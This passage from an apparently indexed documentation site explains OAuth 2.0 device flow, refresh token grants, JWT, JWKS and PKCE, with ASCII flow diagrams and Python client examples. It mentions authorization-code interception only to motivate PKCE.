\u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                         \u2502\n     \u2502 (7) Return access_token when user completes            \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                         \u2502\n     \u25bc                                                         \u25bc\n</code></pre> <p>Python Implementation Example:</p> <pre><code>import requests\nimport time\nfrom typing import Dict\n\nclass DeviceFlowClient:\n    def __init__(self, client_id: str, device_code_url: str, token_url: str):\n        self.client_id = client_id\n        self.device_code_url = device_code_url\n        self.token_url = token_url\n\n    def start_device_flow(self, scope: str = '') -&gt; Dict:\n        \"\"\"Step 1: Request device and user codes\"\"\"\n        data = {\n            'client_id': self.client_id,\n            'scope': scope\n        }\n\n        response = requests.post(self.device_code_url, data=data)\n\n        if response.status_code == 200:\n            return response.json()\n        else:\n            raise Exception(f'Device code request failed: {response.text}')\n\n    def poll_for_token(self, device_code: str, interval: int = 5, timeout: int = 300) -&gt; Dict:\n        \"\"\"Step 2: Poll for access token\"\"\"\n        start_time = time.time()\n\n        while time.time() - start_time &lt; timeout:\n            token_data = {\n                'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',\n                'device_code': device_code,\n                'client_id': self.client_id\n            }\n\n            response = requests.post(self.token_url, data=token_data)\n\n            if response.status_code == 200:\n                # Success! User has authorized\n                return response.json()\n\n            error_data = response.json()\n            error = error_data.get('error')\n\n            if error == 'authorization_pending':\n                # User hasn't completed authorization yet, wait and retry\n                print('Waiting for user authorization...')\n                time.sleep(interval)\n            elif error == 'slow_down':\n                # Increase polling interval\n                interval += 5\n                time.sleep(interval)\n            elif error == 'expired_token':\n                raise Exception('Device code expired. Please start over.')\n            elif error == 'access_denied':\n                raise Exception('User denied authorization')\n            else:\n                raise Exception(f'Token request failed: {response.text}')\n\n        raise Exception('Timeout waiting for user authorization')\n\n    def authenticate(self, scope: str = '') -&gt; Dict:\n        \"\"\"Complete device flow authentication\"\"\"\n        # Step 1: Get device code\n        device_info = self.start_device_flow(scope)\n\n        # Display instructions to user\n        print(f\"\\n{'='*60}\")\n        print(f\"Please visit: {device_info['verification_uri']}\")\n        print(f\"And enter code: {device_info['user_code']}\")\n        print(f\"{'='*60}\\n\")\n\n        # Alternative: verification_uri_complete for QR codes\n        if 'verification_uri_complete' in device_info:\n            print(f\"Or scan this URL: {device_info['verification_uri_complete']}\\n\")\n\n        # Step 2: Poll for token\n        interval = device_info.get('interval', 5)\n        tokens = self.poll_for_token(device_info['device_code'], interval)\n\n        return tokens\n\n# Usage Example - Smart TV or IoT Device\nif __name__ == '__main__':\n    client = DeviceFlowClient(\n        client_id='smart-tv-client-id',\n        device_code_url='https://auth-server.com/oauth/device/code',\n        token_url='https://auth-server.com/oauth/token'\n    )\n\n    try:\n        # Start authentication flow\n        tokens = client.authenticate(scope='tv:control media:play')\n\n        print(f\"\\n\u2705 Authentication successful!\")\n        print(f\"Access Token: {tokens['access_token'][:20]}...\")\n\n        # Now use the access token to call APIs\n        headers = {'Authorization': f'Bearer {tokens[\"access_token\"]}'}\n        response = requests.get('https://api-server.com/user/profile', headers=headers)\n        print(f\"User Profile: {response.json()}\")\n\n    except Exception as e:\n        print(f\"\u274c Authentication failed: {e}\")\n</code></pre>"},{"location":"security/oauth/#6-refresh-token-grant","title":"6. Refresh Token Grant","text":"<p>Best for: Obtaining new access tokens without user re-authentication</p> <p>Description: Allows clients to obtain a new access token using a refresh token when the current access token expires, without requiring user interaction.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     Client       \u2502                                  \u2502  Authorization   \u2502\n\u2502  (Application)   \u2502                                  \u2502     Server       \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                         \u2502\n     \u2502 Initial authorization flow completed                   \u2502\n     \u2502 Client has: access_token + refresh_token               \u2502\n     \u2502                                                         \u2502\n     \u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2502\n     \u2502           Time passes... access_token expires          \u2502\n     \u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2502\n     \u2502                                                         \u2502\n     \u2502 (1) Access token expired (401 Unauthorized)            \u2502\n     \u2502                                                         \u2502\n     \u2502 (2) POST /token with:                                  \u2502\n     \u2502     - grant_type=refresh_token                         \u2502\n     \u2502     - refresh_token=&lt;refresh_token&gt;                    \u2502\n     \u2502     - client_id                                        \u2502\n     \u2502     - client_secret (for confidential clients)         \u2502\n     \u2502     - scope (optional, to request reduced scope)       \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                         \u2502\n     \u2502 (3) Validate refresh token:                            \u2502\n     \u2502     - Check if not expired                             \u2502\n     \u2502     - Check if not revoked                             \u2502\n     \u2502     - Verify client credentials                        \u2502\n     \u2502     - Validate requested scope                         \u2502\n     \u2502                                                         \u2502\n     \u2502 (4) Return new tokens:                                 \u2502\n     \u2502     {                                                  \u2502\n     \u2502       \"access_token\": \"new_access_token\",              \u2502\n     \u2502       \"token_type\": \"Bearer\",                          \u2502\n     \u2502       \"expires_in\": 3600,                              \u2502\n     \u2502       \"refresh_token\": \"new_refresh_token\",            \u2502\n     \u2502       \"scope\": \"read write\"                            \u2502\n     \u2502     }                                                  \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                         \u2502\n     \u2502 (5) Use new access_token                               \u2502\n     \u2502                                                         \u2502\n     \u25bc                                                         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Resource       \u2502\n\u2502    Server        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Key Characteristics:</p> <ol> <li>No User Interaction: Tokens renewed silently in background</li> <li>Refresh Token Rotation: Best practice is to issue new refresh token with each use</li> <li>Reduced Scope: Can request narrower permissions than original grant</li> <li>Long-Lived: Refresh tokens typically valid for days/weeks/months</li> <li>Revocable: Can be revoked by authorization server or user</li> </ol> <p>Security Considerations:</p> <pre><code>Refresh Token Rotation (Recommended):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nRequest 1:  refresh_token_1 \u2192 new access_token + refresh_token_2\nRequest 2:  refresh_token_2 \u2192 new access_token + refresh_token_3\nRequest 3:  refresh_token_3 \u2192 new access_token + refresh_token_4\n\nOld refresh tokens are invalidated after use.\n\nIf refresh_token_1 is used again after refresh_token_2 was issued:\n\u2192 Token theft detected!\n\u2192 Revoke entire token family\n\u2192 User must re-authenticate\n</code></pre> <p>Best Practices:</p> <ul> <li>\u2705 Implement refresh token rotation</li> <li>\u2705 Store refresh tokens securely (encrypted, server-side)</li> <li>\u2705 Set appropriate expiration times</li> <li>\u2705 Implement token revocation endpoint</li> <li>\u2705 Monitor for suspicious refresh patterns</li> <li>\u2705 Limit refresh token lifetime</li> <li>\u2705 Bind refresh tokens to specific clients</li> </ul> <p>Token Response Example: <pre><code>HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"access_token\": \"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...\",\n  \"token_type\": \"Bearer\",\n  \"expires_in\": 3600,\n  \"refresh_token\": \"tGzv3JOkF0XG5Qx2TlKWIA\",\n  \"scope\": \"read write\"\n}\n</code></pre></p> <p>Error Responses: <pre><code>// Invalid or expired refresh token\n{\n  \"error\": \"invalid_grant\",\n  \"error_description\": \"The refresh token is invalid or expired\"\n}\n\n// Refresh token has been revoked\n{\n  \"error\": \"invalid_grant\", \n  \"error_description\": \"Token has been revoked\"\n}\n\n// Invalid scope request\n{\n  \"error\": \"invalid_scope\",\n  \"error_description\": \"Requested scope exceeds original grant\"\n}\n</code></pre></p> <p>Use Cases: - Mobile applications maintaining long-term access - Background services that need continuous API access - Web applications providing seamless user experience - Reducing authentication friction for users</p> <p>Refresh Token vs Access Token:</p> Feature Access Token Refresh Token Purpose Access protected resources Obtain new access tokens Lifetime Short (minutes to hours) Long (days to months) Sent to Resource Server Yes No (only to auth server) Exposure Risk Higher (frequent use) Lower (infrequent use) Can be Revoked Usually not individually Yes Storage Memory/session storage Secure persistent storage <p>Python Implementation Example:</p> <pre><code>import requests\nimport time\nfrom typing import Dict, Optional\nimport json\n\nclass TokenManager:\n    def __init__(self, client_id: str, client_secret: str, token_url: str):\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.token_url = token_url\n        self.access_token = None\n        self.refresh_token = None\n        self.token_expiry = 0\n\n    def set_tokens(self, access_token: str, refresh_token: str, expires_in: int = 3600):\n        \"\"\"Set initial tokens (from authorization code flow)\"\"\"\n        self.access_token = access_token\n        self.refresh_token = refresh_token\n        self.token_expiry = time.time() + expires_in\n\n    def refresh_access_token(self) -&gt; Dict:\n        \"\"\"Refresh the access token using refresh token\"\"\"\n        if not self.refresh_token:\n            raise Exception('No refresh token available')\n\n        token_data = {\n            'grant_type': 'refresh_token',\n            'refresh_token': self.refresh_token,\n            'client_id': self.client_id,\n            'client_secret': self.client_secret\n        }\n\n        response = requests.post(self.token_url, data=token_data)\n\n        if response.status_code == 200:\n            tokens = response.json()\n\n            # Update tokens\n            self.access_token = tokens['access_token']\n            # Server may issue new refresh token (rotation)\n            if 'refresh_token' in tokens:\n                self.refresh_token = tokens['refresh_token']\n\n            expires_in = tokens.get('expires_in', 3600)\n            self.token_expiry = time.time() + expires_in\n\n            return tokens\n        else:\n            error = response.json()\n            if error.get('error') == 'invalid_grant':\n                # Refresh token expired or revoked\n                raise Exception('Refresh token invalid. Please re-authenticate.')\n            raise Exception(f'Token refresh failed: {response.text}')\n\n    def get_valid_access_token(self) -&gt; str:\n        \"\"\"Get valid access token, automatically refreshing if needed\"\"\"\n        # Check if token is expired or about to expire (60s buffer)\n        if not self.access_token or time.time() &gt;= (self.token_expiry - 60):\n            if self.refresh_token:\n                print('Access token expired, refreshing...')\n                self.refresh_access_token()\n            else:\n                raise Exception('No valid access token and no refresh token')\n\n        return self.access_token\n\n    def call_api_with_retry(self, api_url: str, method: str = 'GET', \n                           data: Optional[Dict] = None, max_retries: int = 1) -&gt; Dict:\n        \"\"\"Call API with automatic token refresh on 401 errors\"\"\"\n        for attempt in range(max_retries + 1):\n            try:\n                access_token = self.get_valid_access_token()\n                headers = {'Authorization': f'Bearer {access_token}'}\n\n                if method == 'GET':\n                    response = requests.get(api_url, headers=headers)\n                elif method == 'POST':\n                    response = requests.post(api_url, headers=headers, json=data)\n                else:\n                    raise ValueError(f'Unsupported method: {method}')\n\n                if response.status_code == 401 and attempt &lt; max_retries:\n                    # Token might be invalid, try refreshing\n                    print('Received 401, attempting to refresh token...')\n                    self.refresh_access_token()\n                    continue\n\n                response.raise_for_status()\n                return response.json() if response.content else {}\n\n            except requests.exceptions.HTTPError as e:\n                if attempt &gt;= max_retries:\n                    raise\n\n        raise Exception('Max retries exceeded')\n\n    def save_tokens(self, filepath: str):\n        \"\"\"Save tokens to file (encrypt in production!)\"\"\"\n        tokens = {\n            'access_token': self.access_token,\n            'refresh_token': self.refresh_token,\n            'token_expiry': self.token_expiry\n        }\n        with open(filepath, 'w') as f:\n            json.dump(tokens, f)\n\n    def load_tokens(self, filepath: str):\n        \"\"\"Load tokens from file\"\"\"\n        try:\n            with open(filepath, 'r') as f:\n                tokens = json.load(f)\n                self.access_token = tokens['access_token']\n                self.refresh_token = tokens['refresh_token']\n                self.token_expiry = tokens['token_expiry']\n        except FileNotFoundError:\n            pass\n\n# Usage Example\nif __name__ == '__main__':\n    token_manager = TokenManager(\n        client_id='your_client_id',\n        client_secret='your_client_secret',\n        token_url='https://auth-server.com/oauth/token'\n    )\n\n    # Set initial tokens (from authorization code flow)\n    token_manager.set_tokens(\n        access_token='initial_access_token',\n        refresh_token='initial_refresh_token',\n        expires_in=3600\n    )\n\n    try:\n        # Make API calls - tokens will be automatically refreshed\n        user_data = token_manager.call_api_with_retry(\n            'https://api-server.com/user/profile'\n        )\n        print(f\"User Profile: {user_data}\")\n\n        # Save tokens for later use\n        token_manager.save_tokens('tokens.json')\n\n        # Simulate token expiration\n        time.sleep(2)\n        token_manager.token_expiry = time.time() - 100  # Force expiry\n\n        # This will automatically refresh the token\n        posts = token_manager.call_api_with_retry(\n            'https://api-server.com/user/posts'\n        )\n        print(f\"User Posts: {posts}\")\n\n    except Exception as e:\n        print(f\"Error: {e}\")\n</code></pre>"},{"location":"security/oauth/#oauth-20-concepts","title":"OAuth 2.0 Concepts","text":""},{"location":"security/oauth/#jwt-json-web-token","title":"JWT (JSON Web Token)","text":"<p>Description: A compact, URL-safe token format for representing claims between two parties.</p> <p>Structure: <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Header \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Payload \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u2500 Signature \u2500\u2500\u2500\u2500\u2510\n\u2502                                      \u2502   \u2502                                     \u2502   \u2502                   \u2502\n\u2502 {                                    \u2502 . \u2502 {                                   \u2502 . \u2502 HMACSHA256(       \u2502\n\u2502   \"alg\": \"HS256\",                    \u2502   \u2502   \"sub\": \"1234567890\",              \u2502   \u2502   base64(header)  \u2502\n\u2502   \"typ\": \"JWT\"                       \u2502   \u2502   \"name\": \"John Doe\",               \u2502   \u2502   + \".\" +         \u2502\n\u2502 }                                    \u2502   \u2502   \"iat\": 1516239022,                \u2502   \u2502   base64(payload),\u2502\n\u2502                                      \u2502   \u2502   \"exp\": 1516242622,                \u2502   \u2502   secret          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2502   \"scope\": \"read:user\"              \u2502   \u2502 )                 \u2502\n                                            \u2502 }                                   \u2502   \u2502                   \u2502\n                                            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre></p> <p>Parts: 1. Header: Algorithm and token type 2. Payload: Claims (user data, permissions, expiration) 3. Signature: Ensures token integrity</p> <p>Benefits: - Self-contained: Contains all necessary information - Stateless: No server-side session storage needed - Verifiable: Signature prevents tampering</p> <p>Common Claims: - <code>iss</code> (issuer): Who created the token - <code>sub</code> (subject): Who the token is about - <code>aud</code> (audience): Who the token is intended for - <code>exp</code> (expiration): When the token expires - <code>iat</code> (issued at): When the token was created - <code>scope</code>: Permissions granted</p>"},{"location":"security/oauth/#token-exchange","title":"Token Exchange","text":"<p>Description: Process of exchanging one type of token for another, or refreshing an expired access token.</p> <p>Access Token vs Refresh Token:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    Token Lifecycle                          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nInitial Authorization:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAuthorization Server returns both tokens:\n  \u251c\u2500 Access Token  (short-lived: 1 hour)\n  \u2514\u2500 Refresh Token (long-lived: 30 days)\n\nUsing Access Token:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nClient \u2192 Resource Server\n  Header: Authorization: Bearer &lt;access_token&gt;\n\nAccess Token Expires:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     Client       \u2502                              \u2502  Authorization   \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                              \u2502     Server       \u2502\n     \u2502                                            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502 POST /token                                         \u2502\n     \u2502  grant_type=refresh_token                          \u2502\n     \u2502  refresh_token=&lt;refresh_token&gt;                     \u2502\n     \u2502  client_id &amp; client_secret                         \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                     \u2502\n     \u2502 New access_token &amp; refresh_token                   \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2502\n     \u2502                                                     \u2502\n     \u25bc                                                     \u25bc\n</code></pre> <p>Token Refresh Flow: 1. Access token expires 2. Client sends refresh token to authorization server 3. Server validates refresh token 4. Server issues new access token (and optionally new refresh token) 5. Client uses new access token</p>"},{"location":"security/oauth/#jwks-json-web-key-set","title":"JWKS (JSON Web Key Set)","text":"<p>Description: A set of public keys used to verify JWT signatures.</p> <p>Purpose: - Allows resource servers to verify tokens without sharing secrets - Enables key rotation without service interruption - Supports multiple keys simultaneously</p> <p>Structure: <pre><code>{\n  \"keys\": [\n    {\n      \"kty\": \"RSA\",\n      \"use\": \"sig\",\n      \"kid\": \"key-id-1\",\n      \"n\": \"0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx...\",\n      \"e\": \"AQAB\"\n    },\n    {\n      \"kty\": \"RSA\",\n      \"use\": \"sig\", \n      \"kid\": \"key-id-2\",\n      \"n\": \"xjlCRBqkQxrXLhAz4rCuYn8FaEH3xPFgPAp1cYcPwzPnHdkN...\",\n      \"e\": \"AQAB\"\n    }\n  ]\n}\n</code></pre></p> <p>How It Works: <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Authorization   \u2502                              \u2502   Resource       \u2502\n\u2502     Server       \u2502                              \u2502    Server        \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                     \u2502\n     \u2502 (1) Publishes JWKS at                              \u2502\n     \u2502     /.well-known/jwks.json                         \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                     \u2502\n     \u2502 (2) Resource server fetches                        \u2502\n     \u2502     public keys &amp; caches them                      \u2502\n     \u2502                                                     \u2502\n     \u25bc                                                     \u2502\n                                                           \u2502\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                      \u2502\n\u2502     Client       \u2502                                      \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                      \u2502\n     \u2502                                                     \u2502\n     \u2502 (3) Request with JWT                               \u2502\n     \u2502    Authorization: Bearer &lt;jwt&gt;                     \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                     \u2502\n     \u2502 (4) Resource server:                               \u2502\n     \u2502     - Extracts 'kid' from JWT header               \u2502\n     \u2502     - Finds matching key in JWKS                   \u2502\n     \u2502     - Verifies signature                           \u2502\n     \u2502     - Validates claims (exp, aud, etc.)            \u2502\n     \u2502                                                     \u2502\n     \u2502 (5) Returns protected resource                     \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2502\n     \u2502                                                     \u2502\n     \u25bc                                                     \u25bc\n</code></pre></p> <p>Benefits: - No shared secrets between services - Supports asymmetric encryption (public/private keys) - Enables distributed token verification - Allows key rotation</p>"},{"location":"security/oauth/#pkce-proof-key-for-code-exchange","title":"PKCE (Proof Key for Code Exchange)","text":""},{"location":"security/oauth/#what-is-pkce","title":"What is PKCE?","text":"<p>PKCE (pronounced \"pixy\") is an extension to OAuth 2.0 Authorization Code Flow that provides additional security, especially for public clients (mobile apps, SPAs) that cannot securely store client secrets.</p> <p>Pronunciation: \"pixy\" RFC: RFC 7636</p>"},{"location":"security/oauth/#why-is-pkce-needed","title":"Why is PKCE Needed?","text":"<p>Security Vulnerabilities in Standard OAuth 2.0:</p> <ol> <li>Authorization Code Interception: </li> <li>Mobile apps use custom URL schemes (e.g., <code>myapp://callback</code>)</li> <li>Malicious apps can register the same URL scheme</li> <li> <p>Attacker can intercept the authorization code</p> </li> <li> <p>No Client Secret Protection:</p> </li> <li>Public clients (SPAs, mobile apps) cannot securely store secrets</li> <li>Client secrets embedded in apps can be extracted</li> <li>Compromised secrets affect all users</li> </ol> <p>Attack Scenario Without PKCE: <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  User    \u2502                                          \u2502  Authorization   \u2502\n\u2502 (Mobile) \u2502                                          \u2502     Server       \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                                          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                         \u2502\n     \u2502 (1) Login request                                      \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                         \u2502\n     \u2502 (2) Redirect: myapp://callback?code=AUTH_CODE          \u2502\n     